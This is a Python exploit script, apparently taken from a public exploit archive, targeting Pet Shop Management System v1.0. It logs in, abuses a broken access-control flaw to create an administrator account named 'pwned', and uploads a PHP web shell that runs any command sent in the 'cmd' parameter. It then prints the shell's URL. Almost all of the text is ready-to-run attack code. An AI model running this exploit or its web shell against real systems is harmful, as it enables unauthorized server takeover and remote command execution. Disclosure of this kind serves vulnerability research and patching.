#!/usr/bin/python3
# Exploit Title: Pet Shop Management System v1.0 - Authenticated Privilege Escalation to Remote Code Execution
# Exploit Author: Oscar Gutierrez (m4xp0w3r)
# Date: October 01, 2021
# Vendor Homepage: https://www.sourcecodester.com/php/14962/petshop-management-system-using-phppdo-oop-full-source-code-complete.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/nelzkie15/petshop_management_system.zip
# Tested on: Ubuntu 20.04.2, Apache, Mysql
# Vendor: nelzkie15
# Version: v1.0
# Exploit Description:
#   Pet Shop Management System v1.0 suffers from a broken access control vulnerability (IDOR) in user.php and usergroup.php that allows an authenticated attacker to add and modify users and user control rules. Additionally, Pet Shop Management System v1.0 suffers from multiple arbitrary file uploads that allow an authenticated attacker to upload malicious php files, thus making remote code execution possible which results in full compromise of the application.

import requests
import argparse
import sys

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to login', required=True)
parser.add_argument('-p','--password', help='Password to login', required=True)
parser.add_argument('-t','--target', help='Target to attack example: target.com', required=True)
args = parser.parse_args()
proxies = {"http": "http://192.168.0.195:8081", "https": "http://192.168.0.195:8081"}
target = "http://%s/Petshop_Management_System/" % args.target

def h4x(user, password, target):
    print("[*] Loging into target...\n")
    r = requests.Session()
    data = {'username':args.user,'password':args.password,'status':'Active'}
    response = r.post(url=target + 'controllers/login-user.php', data=data, proxies=proxies )
    response = r.get(url=target + '/main-customer.php',proxies=proxies)
    if "Welcome !" in response.text:
        print('[*] Login succesful\n')
        print('[*] Creating Malcious User...\n')
        files = [
            ('avatar',('pwned.php', '<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>', 'application/octet-stream')),
            ('full_name',(None,'pwned')),
            ('username',(None,'pwned')),
            ('password',(None,'pwned123')),
            ('contact',(None,'pwned')),
            ('email',(None,'pwned@pwned.com')),
            ('user_category',(None,'administrator')),
            ('status',(None,'Active'))
        ]
        uploadShell = r.post(url=target + 'controllers/add_user.php', files=files, proxies=proxies)
        if 'Add User Successfully!' in uploadShell.text:
            print('[*] Application compromised! Navigate to : ' + target + 'user_uploads/pwned.php?cmd=whoami')

h4x(args.user, args.password, target)








